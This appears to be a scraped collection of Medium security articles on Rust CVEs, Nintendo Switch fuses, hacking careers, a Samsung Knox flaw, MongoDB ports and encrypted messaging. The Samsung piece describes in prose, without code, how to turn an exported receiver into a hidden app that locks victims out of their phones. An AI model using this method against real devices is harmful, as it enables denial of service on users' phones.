They have subsequently reaffirmed that they have no intention to file a CVE for this issue, so I went ahead and applied for one myself via http://iwantacve.org/. This is supposed to involve a confirmation by email, and I am yet to hear back. I have no clue how long this will take.
Update: this issue has been assigned CVE-2018-1000657.
This exposes a bigger issue with the standard library: insufficient verification. If this bug — which is relatively easy to observe! — has gone unnoticed for two years, surely something like it is still lurking in the depths of the standard library?
This problem is not unique to Rust. For example, Erlang — that funky language that people use to program systems with 99,9999999% uptime (no, that’s not an exaggeration) — has repeatedly shipped with a broken implementation of Map data structure in its standard library. There is a fascinating series of four articles detailing a systemic approach used to discover those issues.
To actually deliver on the safety guarantees, Rust standard library needs dramatically better testing and verification procedures. Some of its primitives were mathematically proven to be correct as part of RustBelt project, but that did not extend to implementations of data structures.
One way to do that would be to use the same approach as was used for verifying the Map structure in Erlang — building a model of the behavior of the structure in question and automatically generating tests based on it, then verifying that the outputs of the model and the implementation match for certain automatically generated inputs. Rust already has the tooling for that in the form of QuickCheck and proptest.
Another way to verify the implementations is to use a symbolic execution framework such as KLEE or SAW. They work by analyzing the code and figuring out all possible program states for all possible execution paths. This lets you either generate inputs that trigger faulty behavior or make sure that certain behavior is impossible. Sadly, neither of those tools supports recent versions of Rust.
Alas, both of those approaches are time-consuming and would require coordinated effort. It’s not something one can do for the entire standard library over a couple of weekends — otherwise I’d be opening a pull request for Rust standard library by now instead of writing this article.
Oh, and before you bring out the pitchforks and denounce Rust for all eternity: for reference, Python runtime gets at about 5 remote code execution vulnerabilities per year. And that’s just the already discovered ones that got a CVE! How many were silently fixed or still lurk in the depths of Python runtime? Only the bad guys know.
I have once reported a buffer overflow in a popular C library that is used in one of the major web browsers. It was the textbook example of a security vulnerability, and could be triggered simply by opening a webpage. I was told that the bug was silently fixed in a subsequent release that nobody has upgraded to yet. When I asked the maintainers to file a CVE, they said that if they filed one for every such bug they fixed they’d never get any actual work done.
Oh, and the worst thing? The vulnerability I’ve reported in that library was found by a fully automated tool in less than a day. All I did to discover the vulnerability was basically point and click. Imagine how many more exploitable bugs a dedicated security expert could discover!
This was when I have actually understood and internalized that everything is broken.
The horrifying thing for me is that I still use that web browser. It’s not like I have any alternatives — every practical web browser relies on a huge mess of C code. And it is evident that humans are unable to write secure C code, unless they swear off dynamic memory allocation altogether.
This is why I’m so hopeful about Rust. It is the only language in existence that could really, truly, completely and utterly supplant C and C++ while providing memory safety. There is a mathematical proof of correctness for a practical subset of safe Rust and even some inherently unsafe standard library primitives, and ongoing work on expanding it to cover even more of the language.
So we know that safe Rust actually works. The really hard theoretical problems are solved. But the inherently unsafe parts of the implementation, such as the language runtime, could use more attention.
Update: Brian Troutwine has kicked off a project to validate Rust standard library primitives using QuickCheck! Check out bughunt-rust on GitHub, and join the hunt!
Discuss this article on Reddit
Written by
","['Programming', 'Rust', 'Security', 'Vulnerability', 'Cybersecurity']"
How the Nintendo Switch prevents downgrades by irreparably blowing its own fuses,https://medium.com/hackernoon/how-the-nintendo-switch-prevents-downgrades-by-irreparably-blowing-its-own-fuses-884bd3b7a8ba?source=tag_archive---------2-----------------------,"Downgrade prevention has been a cat-and-mouse game between consumers and companies since the inception of remote updates. The Nintendo Switch adopts a worrisome-strategy of preventing firmware downgrades by permanently modifying your device every time it updates. While this isn’t a new concept (the Xbox 360 was doing it back in 2007), it is part of a greater effort to prevent end users from modifying their devices to their liking.
The Nintendo Switch use an Nvidia Tegra X1 SoC, which comes with a fuse driver. This allows it to programmatically blow fuses — permanently modifying the device, making it impossible to revert to a previous state.
The boot loader verifies a specific fuse, FUSE_RESERVED_ODM7, to prevent downgrading.[1] Each software version expects a different number of fuses to be blown — if more than is expected, it fails to boot, and if less, it’ll blow those fuses and then proceed to boot. Blowing a fuse is irreversible— once it’s been set it can never be undone. It’s theoretically possible to physically modify the SoC and replace the fuses, but it’s so prohibitively invasive and expensive that it’s not a real option.
There are 256 bits in the set of ODM_RESERVED fuses, and there are 8 ODM_RESERVED. This allows for 32 fuses, or 32 future FW versions (provided they burn a fuse on every major release).
Just this week the first serious exploit of the Switch BootROM was released. This is not a remotely patchable exploit, which means that all ~15 million devices currently out are vulnerable and will continue to be vulnerable for their lifespans. fail0verflow also released a Linux side loader, although as of this writing it is not yet ready for the public.
[1] http://switchbrew.org/index.php?title=Fuses#Anti-downgrade
Written by
","['About', 'Help', 'Go Home', 'Gaming', 'Security', 'Programming', 'Cybersecurity', 'Nintendo Switch']"
How to be Hacker? Tips to Choose Right Path - Babar Akhunzada - Medium,https://medium.com/@babarakhunzada/how-to-be-hacker-tips-to-choose-right-path-db82ebd1e5ac?source=tag_archive---------8-----------------------,"Same like other InfoSec guys i also get many messages about how can we get into this field and how can we start , where to start , where to learn , how to apply , what skills i need to start it? and many many more .
So i think this article will help many of you , how to get start and how to get into this InfoSec field. Remember its up to you guts if you know little about it you will learn many new things , but if you seen some one doing it and you thing you will start that too , then note it down it isnt that easy you thinking.
First develop some real skill in computer , learn about networks and web working then come and Join the Party.
So where should I start? I want to get into itThis vague, open ended and very ambiguous question is very similar to someone asking how they should go about getting into information security. The first thing to realize is there is a huge range of information security fields, and within each of those huge fields is a lifetime’s worth of learning content. Just like picking a sport there is no ‘best’, it’s simply sometimes area’s you may enjoy more than others. Off the top of my head here are some example area’s that is by no means exhaustive.
Most of these are more of a technical nature while others are more of a theoretical focus. I guarantee that whatever you like there are others out there who will find it boring, just as you will with what others are interested in sometimes. Right now it’s expected that if you’re reading this you may know very little about any of these area’s but what’s important is your willingness to learn and what type of motivation you have.
The Hacking TypeOne trademark that is almost universal of people throughout those fields is their focus on independent, self directed learning. Sadly in a few ways security is still viewed as a ‘dull craftsmanship’, I mean why might anybody need to know how to break into a PC framework unless they were going to do as such? Thus a lot of individuals will indicate hatred to out and out antagonistic vibe when getting some information about security related inquiries under the false (maybe now and then genuine) supposition it’s only a ‘script kiddie’ hoping to figure out how to hack frameworks as opposed to needing to learn and utilize that learning for a decent reason. It’s likewise a truth that the “learning” assets of data security are entirely incoherent with no genuine focal storehouse of learning material.
The purpose of highlighting this is whether you wish to flourish and effectively go into the data security field you ought to be arranged to bounce in and discover your way without sitting tight for somebody to hold your hand and lead you down the right way. Google a portion of the above terms and see what sounds like fun. Notwithstanding what some of the time appears like a steady fight to locate the “best” field to learn, or the “best” asset, or the “best” approach to learn regularly additional time is spent stalling pondering these inquiries as opposed to committing the opportunity to really learning. Turn upward video’s on youtube for hacking examples — it’s alright on the off chance that you don’t realize what a considerable measure of it means, yet record a rundown then google those terms. Use purposes of enthusiasm to bring forth out with an always expanding web of information around subjects you’re ke
Do I need to learn X first?Yes Of course you need to have a full knowledge of the OSI layer before you begin. Yes you need to read that 1000 page book on the TCP protocol. Yes you need to be proficient in 5 programming languages (at least!) before you consider hacking. Can you compile your own Linux kernel from source code? No? Don’t bother learning hacking. Actually…. all that is full of rubbish, yet it’s one of the most common responses given to people looking to learn information security. There is one requirement to becoming a decent hacker — interest. The difference between a future hacker and a script kiddie isn’t knowledge, it’s the willingness to learn.
As long as you have a vague idea of how to use a computer you’re at the starting point you can work with. Yes if you don’t have a solid understanding of how TCP works you should have that on your to-do list to look up when someone is talking about it in a hacking tutorial — but it’s ridiculous to think you need a ton of prerequisite knowledge before you’re allowed to start learning about topic’s you’re interested in. When you’re looking up how that login puzzle works on a hacking site and it uses JavaScript you’re going to learn how JavaScript works. When you read through how a buffer overflow works and it has a Python template you’ll learn some basics of Python. No, you won’t get a job as a developer in those languages at the end of it but you’ll pick up the common way’s to break the language.
Informal Learning“Ok, I get the hint — I need to learn things myself, but can you at least give me a starting point?”
Sure, there are a ton of great free or cheap resources out there to get started depending on what topic appeals to you. Here are some examples.
Most people think Hacking can be managed from books and tuts , but it isnt like that if you know any programming language it will be great edge you have . Just learn one and be Master .
Web Application Security
Reverse Engineering / Malware Reversing
Network Security
Exploit Development
Other than that, Google, Google, and some more Google. I’ve left off some area’s such as forensics and compliance because personally I’m not interested in them so I haven’t gone looking for resources, I’m sure there are some fantastic ones out there.
Things to learn : Outside of the free resources you can also begin to get certificates to make yourself more appealing to employers if you wish to transition into the field as more of a career path. Some certification’s I’d highly recommend would be the “Penetration Testing with Kali Linux” course from Offensive Security (link) if you’re interested in network security. It’s easily one of the best learning experiences I’ve ever had in the field and taught me more in 60 days than I’d learnt in a year on my own. Their “Cracking the Perimeter” is also a great course, focusing a little more on exploit development (link).
If you’re looking at developing your programming skills things like SecurityTube’s “Python for Pentesters and Hackers” (link) is a great foundation that will teach you how to do plenty of nifty things like building your own port scanners, password crackers etc. I don’t place a huge value into their certification’s that they offer from an employment perspective, but I’d look at it more as a consolidated lump of knowledge and examples for sale which can still be valuable.
The “Certified Ethical Hacker” course is another commonly mentioned. Honestly it’s typically looked down upon so I don’t think it’s necessarily worth the money — but if you need a formal course to learn things then it might be worth the money to you. A lot of these certifications and their value are discussed over at TheEthicalHacker.net’s forums located here.
“Just seeing if you can”Hacking is all about gaining access to things that we’re not intended to. Making an adventure, finding a SQL infusion, Password Cracking it’s all intended to put us towards the objective of taking control of the case we’re assaulting. I promise verging on each new programmer has begun imagining about “Recently checking whether they can” access that school site.
“Just checking whether they can” get to the neighbors WiFi framework. Sending their partner a trojan disease “just to check whether they can” take control. More lamentable still you might end up passing by spots, for example, HackForums.net and seeing numerous individuals endeavoring to debase others with RATs, amass botnet’s thus on under the impression this is hacking, or heartbreakingly this is the primary way you can learn.
I need to emphasize that this is not the case. Any type of “just seeing if you can” type exercises can be replicated through the use of virtual machines, your own routers or even capture the flag / wargame competitions out there. Being realistic even if you can access another person’s machine, what are you going to do with it? Are you really going to try and steal credit card details and make fraudulent transactions? Are you really going to steal passwords and be paranoid that your activity is going to be traced back to you for the sake of peeking at someone’s emails? There have been plenty of examples of newbies being charged, not realizing the seriousness of the crimes they are committing. If you went for a job with the FBI and they had a look through your post history would you like them to read that post about you asking how to host a botnet? It’s a classic example of what’s on the internet is forever, and if you really want a career in information security you need that clean record to obtain any security clearances you’re going to need to do your job. Getting caught for stupid stuff just isn’t worth it.
SummarySo after a long ramble, what’s the key points?
So be kind to it and enjoy it , all thing you got is Hacking and its a challenge & remember if you love it , dont run from it chase it and make it your own . if you hired an instructor for it you will learn just from him you will be limited up to some extent but you learn by own you will research good and will easily gather much info you need and will have good base there . its all that Matter
Got a Problem , Ping me !
Written by
","['Hacking', 'Cybersecurity']"
How to brick all Samsung phones - Elliot Alderson - Medium,https://medium.com/@fs0c131y/how-to-brick-all-samsung-phones-6aae4389bea?source=tag_archive---------2-----------------------,"Few months ago, I bought a Samsung phone in order to analyse it. After few hours I found an unprotected receiver in the ContainerAgent application.
The ContainerAgent application, version 2.7.05001015, contained a broadcast receiver called SwitcherBroadcastReceiver.
As you can see, this receiver is enabled and exported by default. Let’s check the implementation in order to understand how to trigger this receiver.
By looking the onReceive method of the SwitcherBroadcastReceiver, we are able to deduce that:- This receiver expect com.samsung.android.knox.containeragent.LocalCommandReceiver.ACTION_COMMAND as an action.- It check the value of an integer extra called com.samsung.android.knox.containeragent.LocalCommandReceiver.EXTRA_COMMAND_ID. This extra can have 2 values: 1001 and 1002.- It check the value of an integer extra called android.intent.extra.user_handle.
It’s time to construct the intents and understand what are their effects. If the extra ACTION_COMMAND is equal to 1001, the immediateLock method is called with the value of the extra user_handle as a parameter.
That’s interesting! So, if I set the value of user_handle to 150, the user id of the “Knox user”, it will lock immediately the Knox container. The final intent to lock the Knox container is:
In the same way, if the extra ACTION_COMMAND is equal to 1002, the switchToProfile method is called with the value of the extra user_handle as a parameter.
So, if I set the value of user_handle to 0, the user id of the first user, it will switch automatically to the first page of the launcher. The final intent to switch to the first page of the launcher is:
The next question is: How can we weaponize this vulnerability? Simple, we will create a “Locker application”.
In this Proof Of Concept (POC), I send these 2 intents every second. Moreover, after opening this app the 1st time, the app icon will disappear.
As a consequence, the device will be inoperable due to this local DoS. Every time the victim will open the SecureFolder app, the container will be locked and every time he will try to use his phone, the phone will come back directly to the first page of the launcher.
Follow me on Twitter! You can also find a small part of my work at https://fs0c131y.com
Written by
","['Elliot Alderson', 'Android', 'Hacking', 'Vulnerability', 'Security', 'Cybersecurity']"
How to Change MongoDB Default Listening Port (27017),https://medium.com/mongoaudit/how-to-change-mongodb-default-listening-port-27017-92e35f65670e?source=tag_archive---------0-----------------------,"Disclaimer: this how-to guide only applies to self-managed MongoDB servers. Sadly enough, most “MongoDB as a Service” providers do not allow you to choose the listening port.
You can specify mongod’s listening port by setting it in the mongodb configuration file.
Open /etc/mongod.conf with your favorite code editor and search for the following lines:
If you can’t find mongod.conf or it is named mongodb.conf instead, it means that you are using a really old and broken version of MongoDB. Please read this guide on how to upgrade to a more recent version.)
Now change the port number to any other of your choice, save and reload mongod:
Please take into account that the chosen port needs to be equal or greater than 1000 and must not be taken by any other service running in the same host. You can check if a certain port is already in use with the nc command:
Under some circunstancies you may want to run mongod directly from console instead of as a demon or service. In these cases, there is an argument you can add to your mongod start command in order to specify the listening port:
As said in Plan A, the chosen port needs to be equal or greater than 1000 and must not be taken by any other service running in the same host. You can check if a certain port is already in use with the nc command:
Written by
","['News', 'Data breaches', 'Vulnerabilities', 'Mongodb', 'Database', 'How To', 'Infosec', 'Cybersecurity']"
How to Communicate Privately in the Age of Digital Policing,https://medium.com/better-humans/how-to-communicate-privately-in-the-age-of-digital-policing-cf78ff2a79a7?source=tag_archive---------3-----------------------,"Let’s say that you’re sitting in your living room in your London flat and chatting with a dear friend. You’re discussing something personal and maybe even a bit scary: your doctor has noticed something unusual on your skin and wants to run a biopsy to test for cancer. Your friend sits with you, listening, while you get emotional about how the mere mention of the word cancer is making you angry, sad, worried, and nervous. You describe how a diagnosis of cancer might impact your career, your earning potential, your social life, your relationship with your significant other and more.
Do you have, sitting there in your living room, the right to a private conversation? Of course, you do. Do you have concerns about whether your conversation on a private and personal matter is being overheard by others and, perhaps, being used against you? Of course, you don’t: it’s a private conversation in a private setting.
But now let’s now say that you’re having the very same conversation with the very same friend while you sit in the very same living room in London. Only now, let’s imagine that your friend is sitting in her living room in Mumbai, where she lives. As a result of the distance, let’s say that you’re having the long-distance conversation via a phone call, a video chat app, or text messages.
Do you have, while using this technology, the same right to a private conversation? Of course, you do. Do you have concerns about whether your conversation on a private and personal matter is being overheard by others and, perhaps, being used against you? Unfortunately… the answer to that question isn’t as clear in today’s massively interconnected world.
Privacy and security experts would caution you — and rightly so — to think about what it is that you’d like to communicate before you do the communicating, and then choose the best tools to make that communication as secure and private as you’d like it to be. How to implement this approach is what we’ll be discussing today, so let’s jump right in.
Some of you may be thinking, “What’s all the fuss, brah? I’m cool with sending text or SMS messages; I’ve got no problems chatting with my peeps via Facebook, Twitter, and other social media platforms; Slack is totes fine for live-chatting with my colleagues; and I still believe in using old-fashioned email, the nearly 50-year-old technology that never lets me down!”
I get it. All of the messaging options I just mentioned are readily available and easy-to-use. Unfortunately, they’re also considered insecure for important reasons which I’ll refer to as “The Three Canaries”:
For some eye-opening statistics, check out the transparency disclosures — all linked below — from Amazon, Facebook, Twitter, Snapchat, Microsoft, Apple, and Google. You’ll notice three trends if you parse these data: first, the number of requests from government and law enforcement for your personal data grows every year; second, technology companies comply with these requests most of the time; third, The United States — that beacon of freedom! — issues more requests for user data than every other country. By a huge amount. �
Sigh.
Fear not, citizen! There are always tools available to help us achieve our legal goals, and this situation is no different. In our case, to lessen or eliminate The Three Canaries, we should only use secure messaging solutions that offer end-to-end encryption (or “E2EE” if you like sounding fancy).
E2EE, used most often with secure messaging systems, is a method of encrypted communication where only the communicating users — just the sender and the receivers — can read the messages. When users employ E2EE, the Internet Service Providers, cellphone companies, oppressive governments, private investigators, spy agencies, or even the companies providing the E2EE service cannot view the contents of your encrypted messages.
To understand why E2EE is so important, let’s go back to your living room and the conversation with your dear friend about your health. Now, let’s view that same conversation through the lens of The Three Canaries:
Now we’re getting somewhere. We’re taking back some of the privacy that’s been removed from our control. With that in mind, let’s review the best options available for secure messaging and email.
Please note: in nearly every case, I’ll be highlighting the iOS version of each solution. There’s a reason for that: Apple’s iOS is — by far — safer than either Microsoft’s Windows or Google’s Android. These results have been confirmed by others. Repeatedly. And then again. And then again.
You might not like that, but thems the facts, kiddo. And if we’re going to focus on secure communications, then we’ll need to take the entire OS into consideration as well, not just the apps that run on them.
For our purposes, I’ll define a message as “a short note or picture which is digitally transmitted via some method other than email”. For any messaging service to be considered secure, it must demonstrate — at the very least — that:
BONUS if the software is 100% open source and offers self-destructing messages.
After reviewing the list above and comparing those needs against a comparison of all messaging services on the market, there are — it turns out — only three substantive choices when it comes to picking the most secure messaging services. Signal is largely considered the best, while Threema and Wire are both considered excellent as well.
Signal is the top secure messaging choice for most security professionals and for popular technology websites like Wired magazine. It’s easy to use, very secure, and — unlike most of the other messaging options — it was designed to be an entire end-to-end platform, not just an application. In fact, Signal’s technology, also known as the Signal Protocol, was adopted by WhatsApp, so it’s now become the de facto standard for the majority of secure messages sent on the planet. That’s billions of secure messages sent every day — pretty amazing. What’s also amazing is that Signal brings their E2EE to your messages, phone calls and — get this — your video chat. Yup! As long as all parties are using Signal, the app will protect literally everything that you communicate with E2EE.
I never say this — literally, never — but to get started with Signal, you should read the company’s privacy policy. I know, I know: it sounds like I’m asking you to poke your eyeballs out with a butter knife, but trust me. It’s only a few paragraphs long, and its worth reading because of how nice it is to see a company caring about your privacy.
Download the app for iOS (avoid using the desktop versions, please—more on that below) and launch.
On the first launch, Signal asks you to provide a phone number as shown below, at left. Enter any valid phone number you have and remember: this doesn’t have to be and probably shouldn’t be your actual cell phone number (more on that below under “Caveats”). When you click “Register”, Signal sends a confirmation code to the phone number you provided. Enter the six-digit code they’ve sent by text message on the screen, at right, and click “Submit”.
Now, you’ll create a profile name and avatar. You can choose to have this profile easily identify you or not. When you’ve chosen your profile name and Avatar, tap “Save”. Your profile name and picture will be visible to any new contact you add; consider using something familiar to them, so that they’ll recognize you. Conversely, consider using something generic and mysterious if you prefer less name or face recognition. In my case, I chose to use my initials and a picture of a cat that may or may not be the same cat that I did or did not rescue when she was just one-day-old. #Softie
When you arrive at the main Signal application window, you’ll most likely want to press on the familiar-looking new message icon in the upper right of the active window. When you do, Signal will ask to have access to your contact list. You don’t need to provide this if you don’t feel comfortable: it’s only a convenience. Instead, you can always search to see if the people you’re trying to message are already on Signal by entering their phone numbers. That means, of course, that you’ll need to know their phone numbers. Conversely, you can choose to trust the company’s claim that they don’t store your contact’s info on their servers. At left, below, is how Signal will look (on iOS) if you’ve provided access to your contacts. At right, below, is what the app will look like if you do NOT give that access.
Once you’re set up, Signal works like most other messaging apps, so you can easily send a note, include an attachment, record audio, or initiate a phone or video call. The layout is simple and intuitive. In case you’re confused, here’s a quick infographic (on Signal’s iOS app) to help get you started:
Signal has a well-stocked, easy-to-read set of help pages for its basic functionality, so while you spend some time learning the basics, I’ll instead focus on a few of its deeper security features that you should implement: safety numbers and disappearing messages.
Click here for Signal’s documentation on Safety Numbers.
On iOS, when I open a new message window with my lovely and fake friend Carter, I can tap on his avatar as shown below, at left. You’ll notice it says “Tap here for settings”. When I do this, I’m shown a variety of settings and tools that Signal makes available on a per-user basis. Let’s start by tapping on the “View Safety Number” shown center in the blue box. The contents of that screen can be seen at right.
The Safety Number is a Signal feature that allows you and your communication partners to confirm that your conversation with each other is secure. For those with extreme privacy/security needs, take the time to open this setting and confirm — with your intended recipient — that your numbers match. Alternately, you can choose to scan one another’s square QR code by pressing the “Tap to Scan” button as shown and verify one another in person.
The Intercept has an excellent article on this feature and why it’s essential.
Later, if your communication partner gets a new phone and has to re-install Signal, you’ll be warned on-screen that your safety numbers with this individual have changed. This doesn’t mean that you’re no longer communicating with the same individual. But it might, so it’s worth confirming that fact with whatever other secure methods you and your partner have at your disposal.
Click here for Signal’s instructions for activating disappearing messages on iOS.
Signal also features disappearing messages, a tool which can help reduce or eliminate your secured conversations from being captured. Disappearing messages are activated on a per-user basis and can be set to expire from five seconds to one week. For those matters which are “top-secret”, consider a shorter period of time; for those which are “moderately-secret”, consider a slightly longer time. Use your best judgment and, whenever possible, agree to your guidelines in advance with those to whom you’re communicating.
On iOS, access to disappearing messages is activated on a per-user basis, in the same settings menu where you’ll find your Safety Number as shown here:
Signal isn’t perfect, but no app, platform, or technology is. Here are a few things to consider for those of you who will choose to use Signal.
Some folks and comparison websites rank Wire as being more secure than Signal. Others, like this fella here, just think it’s a pretty solid alternative:
I certainly understand the curiosity about Wire: it’s easy-to-use, doesn’t require you to pony up a phone number to use it, and is regularly vetted by outside security professionals. In fact, the company prides itself on being “the most extensively publicly audited collaboration and communication software on the market” (their quote, not mine).
I like Wire because it offers something that Signal doesn’t: a security screen.
If the Wire app is open but not in use, it locks itself down from prying eyes. That means if I switch from Wire to browsing the web and then navigating back to Wire, I will NOT be able to see all of my in-progress chats. Instead, I’ll be met with a challenge — shown below — to unlock Wire using either the password it asked me to create during setup or using Touch ID/Face ID. Very smart feature. It prevents someone from grabbing my phone and having immediate access to all of my unencrypted messages.
Threema offers many of the same features as Signal and Wire, but three things set it apart from the crowd:
You may wonder why I’d suggest that having to pay for an app — currently priced at $2.99 USD — is a benefit. Good tech isn’t free to build. Therefore, developers need to find funding from someone. That someone is usually another corporation. In this case, however, the public pays money directly to the developers, and that frees their parent company — Threema GmbH — from having to be beholden to any other company or government for its funding. That independence is important and 100% worth the money you’ll pay.
There’s one technology that we all continue to use that hasn’t evolved since the 1960s: EMAIL. Email was born before the Internet, making it nearly fifty years old. That’s some serious senior citizen technology status. Despite the availability of newer messaging technology — texting, social media, Slack, and video chatting — email is not only still going strong, but it’s also actually thriving. In 2018, 281 billion emails were sent on average… per day, and that’s expected to top 333 billion by 2022. � �
What’s shocking about email is that most of us continue to depend on it as it was originally designed, which is nothing short of miraculous. However, it’s also highly questionable because email is neither safe nor private when it comes to communicating sensitive matters.
Email creates—and then leaves behind—a very recognizable digital breadcrumb trail that can lead back to you. For this reason — even if you’re using a secure email solution — you should always assume that your subject line, your IP address, the time/date stamp of your email and your actual email address can be seen by those seeking to digitally police you. These data are known as metadata: it’s the data which reveals information about you and about your communication but isn’t the actual communication in question.
“As an analyst, I’d prefer to be looking at metadata rather than content because it’s quicker and it’s easier and it doesn’t lie.” — Edward Snowden
Given that, is there really such a thing as “secure email”?
I think there is, but it takes a bit more effort and isn’t more secure than what Signal offers.
In order to be considered secure (or “more secure”), an email service must demonstrate — at the very least — that it:
BONUS if the software is 100% open source and offers self-destructing messages.
After reviewing the list above and comparing those needs against a comparison of all messaging services on the market — sometimes twice — there are only three top choices. ProtonMail is largely considered the best, while EasyCrypt.co offers an interesting alternative.
There are many good reasons why ProtonMail is ranked as one of the world’s most secure email providers. It’s simple enough that anyone can use it; the platform was designed by scientists from CERN and MIT; their servers are located in Switzerland in a secure vault that’s buried one kilometer under rock (you can’t make this stuff up); they’ve been audited by third-party security professionals. Even better, ProtonMail offers a 100% free tier, so you have no excuse to not sign up and give it a try.
More importantly, all messages sent from one ProtonMail account to another are encrypted with PGP. PGP, or “Pretty Good Privacy” (I know, the name is hysterical) is a decades-old and extremely well-respected security protocol for sending secure and encrypted emails. What’s so great about ProtonMail’s version of PGP is that it all happens behind-the-scenes, by default, with no extra work or setup required on your part.
Therefore, one of the easiest, cheapest, and most secure ways that you and your sensitive contacts can email one another is for you all to have accounts on ProtonMail and only email each other using that system.
Setup is easy: simply download the ProtonMail app for iOS and follow the prompts to create and set up the service. You’ll be led through a series of windows to establish your account. For those with the most pressing needs, choose the “Extreme Security” option.
Worth noting: no phone number or email address is required to set up your account. You may elect, for convenience, to provide ProtonMail a recovery email address if you’re the kind of person who forgets your login password. If you’re a whistle-blower, informant, spy, or citizen in a brutally repressive regime, do NOT use a recovery email address. Instead, just remember your password, OK?
Once you’ve logged in, ProtonMail is just as easy to navigate and use as any other webmail service. Know how to use Gmail or Outlook? Then you’ll intuitively already know how to use ProtonMail. There’s a recognizable navigation button in the upper left of the application window. Touching that allows you to navigate your ProtonMail account folders, along with the application’s full suite of preferences.
You’ll notice that I’ve highlighted the “Settings” control. That’s because the very first thing you need to do is protect the ProtonMain application with a security PIN. Touch Settings -> Enable PIN protection. You’ll be prompted to enter a numerical password twice: once to set it, and a second time to confirm it. Setting this PIN locks the ProtonMail application from view if you switch to any other application on your iPhone, including viewing the desktop.
This is similar to what the Wire secure messaging app provides by default, and it’s a simple and protective measure to take. Doing this ensures that no one can grab your phone and see the contents of your ProtonMail without also knowing your PIN. This step is so important, I’ve created a video for you. For those paying attention, you’ll see that I’ve set my PIN to “8675309” so the only other person — in the entire world — who’d ever know my password is, obviously, Jenny.
By default, ProtonMail messages don’t expire. But ProtonMail gives you the power to set an expiration time on any email message! It’s like “Mission Impossible”: pretend you’re Agent Ethan Hunt and get yourself some self-destructing messages! If you choose to leverage this amazing tool, you can choose an expiry time between one hour and 29 days, 23 hours. For the most secure messages, choose a short time.
To access this feature, open a new message. Then, click on the hourglass icon as shown below at left. Using the two scrollable fields at the bottom of your new message, choose the number of hours and minutes before your email will disappear forever, then click the arrow as shown below, center. Once your expiration date is set, the hourglass icon will change to include a checkmark, as shown below, right. Now, you can add an email address, subject line, and the body of your email.
When you’re ready to send, click the plane icon at top right.
I mentioned earlier that ProtonMail, by default, enables encryption for all emails sent between all ProtonMail accounts. But what if the person you need to email is not a ProtonMail user? Good news: ProtonMail also allows you to encrypt messages to anyone outside the ProtonMail system. This functionality is easy to use, incredibly smart and built right into the system.
To begin, open a new message window and click the lock icon as shown below (left). When you do, you’ll be met with a prompt (below, center) asking you to provide and then confirm an encryption/decryption password for your email. ProtonMail permits you to include a hint for that password when your notification is delivered! Before you send your email, confirm that it’s protected with a password by looking for the checkmark on the lock icon as shown below, right.
Here’s how ProtonMail makes this nifty security feature work: non-ProtonMail recipients don’t actually receive your email; instead, they receive a link to view your email on ProtonMail’s servers. That email remains encrypted to anyone who doesn’t possess the password. This is why it’s important to only share the password with your intended contact through a method other than email: use a phone call, text, fax, mimeograph or — if you’re extremely old school: smoke signal. Just don’t send an email password to someone using email, OK?
Receiving a password-protected email from a ProtonMail user is also worth sharing. Non-ProtonMail users receive an alert that they have a secure message. That email includes the password hint that you remembered to include as shown in the red box below (left). Clicking on the blue “View Secure Message” button opens a browser window and prompts the user to enter the decryption password below (center). Once the correct password has been entered, your email is displayed as shown below (right). Note that all secure messages, by default, time out after 28 days, as shown in the yellow box.
ProtonMail is a fantastic email app, but improvements are always possible. Here are a few things I’d love to see implemented:
Earlier, I mentioned how metadata from our emails are always available to people looking to digitally track us. Only, I saved a little secret for last: there’s one company that seems to have found a way to encrypt every part of your emails, even — they claim! — your metadata. That company is EasyCrypt. Easycrypt has, somehow, managed to create an email solution that is:
EasyCrypt pulls this miracle off because they are NOT an email service and don’t provide you with an email address: rather, they’re a service that encrypts your already existing webmail, allowing users to send E2EE emails using a type of PGP via any existing email service.
Currently, the service is still in beta testing, so not all of the features are ready for primetime yet — including metadata encryption — but what they’re building is fascinating and creative enough to have caught my attention. While in beta, I’m able to test how sending and receiving works via my own Gmail address. Initial test runs are extremely promising.
Once you’ve signed up for an Infocrypt account, it will ask you for permission to manage your email of choice. I’m using a Gmail address and the images below are what that permission process looks like. As you can see, Gmail makes it clear that Infocrypt has not yet been verified by Google. I’m hoping that changes soon, but won’t hold my breath: Google uses AI to scan every email for every user in order to collect data. Any company that hopes to prevent that data collection from happening might not be verified.
Once you’ve connected your email account — Gmail, Outlook, Yahoo, etc — to Infocrypt, you no longer log into your webmail portal. Instead, you log into Infocrypt and that becomes the portal into your already-established email. That can be seen in the image (lower left). There are all of my same folders and email messages that I’d see if I’d log into Gmail. However, any encrypted email that I send (and as you can see, I sent one to Infocrypt) is tagged with green to help identify it.
I did nothing to make that happen: just sending an email to the folks at InfoCrypt automagically made that email encrypted behind the scenes.
The magic is this: when I open up the very same email through my normal Gmail web portal, I am unable to read that message, shown below right. Neither is Google. Neither is anyone. That’s a huge deal. I didn’t have to sign up for anew email address, I didn’t have to figure out how to use PGP, and I didn’t have to waste any time. I just logged into my already longtime email address via another portal.
Magic.
EasyCrypt provides a handy set of help pages which makes learning how to use their creative solution that much easier.
Digital tools change frequently in response to the constant erosion of privacy, as well as the ever-changing nature of technology. It’s best to save one or more websites that will do the hard work of keeping their guidelines and recommendations up to date.
For me, one of the very best is the surveillance and self-defense project from The Electronic Frontier Foundation or EFF. The EFF has been on the frontlines of digital security, user privacy, and free expression for almost thirty years — an eternity in the tech world. Their guide to safe communication is updated regularly and is required reading for those looking to stay ahead of the curve. Ditto for PrivacyTools.io.
Written by
","['Directory', 'Podcast', 'macOS', 'open-sourced', 'Privacy', 'Cybersecurity', 'Security', 'Freedom', 'Email']"
How to detect hacker’s port scanning in less than 50 bucks,https://medium.com/@almog009/how-to-detect-hackers-port-scanning-in-less-than-50-bucks-40ff71a86aea?source=tag_archive---------3-----------------------,"There’s a huge misconception in the security industry about hacker methodology when it comes to internal threats, unfortunately most people still believe hackers are using port scanning tools like NMAP or Angry IP scanner when they want to discover elements in the enterprise network, they are so wrong and it’s affecting their defense strategy and their company security.
Setting aside the intelligence hacking efforts of governmental agencies, the attacker’s attack incentive in 95% of cases is Monetization, this is why many of the “bad” guys are changing their path to Ransomware in the last few years, “easy” money, higher Return-on-Investment(ROI); Based on this, I hope you agree hackers don’t wake up in the morning and start hacking for no reason, and usually they are being managed by business people driven by high yield ROI.
The answer is very simple, hackers don’t want to get caught in the middle of their operation, it takes a lot of time/people to breach networks, whether it’s a custom social engineer or hacking the cloud or DMZ servers, it takes lots of resources == money.After working so hard to penetrate the target’s network why would the try to use a scanning tool like NMAP? which is very easy to detect from a defense point of view. why use such method when you have other great options which will evade almost any solution???
Well I mainly blame three things:
